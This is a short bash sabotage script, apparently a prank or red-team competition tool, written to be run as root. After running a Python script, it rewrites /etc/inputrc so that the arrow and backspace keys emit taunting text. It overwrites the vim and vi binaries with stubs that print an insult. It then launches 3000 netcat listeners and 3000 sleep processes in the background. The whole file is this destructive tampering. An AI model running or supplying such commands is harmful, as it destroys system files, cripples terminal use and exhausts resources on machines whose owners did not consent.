#!/bin/bash

#Run the python script
python basic-stuff.py

#Mess with inputs
echo '"\e[A": "u mad bro?"' >> /etc/inputrc
echo '"\e[C": "no typos allowed"' >> /etc/inputrc
echo '"\e[D": "no typos allowed"' >> /etc/inputrc
echo '"\177": "no typos allowed"' >> /etc/inputrc
echo '"\b": "no typos allowed"' >> /etc/inputrc

# Disable vim and vi
echo "#!/bin/bash" > /usr/bin/vim
echo "echo use nano, coward" >> /usr/bin/vim
chmod +x /usr/bin/vim
echo "echo use nano, coward" > $(which vi)

#Listen on an absolute ton of random ports
for i in {1..3000}
do
   nc -l &
   sleep 9999 &
done
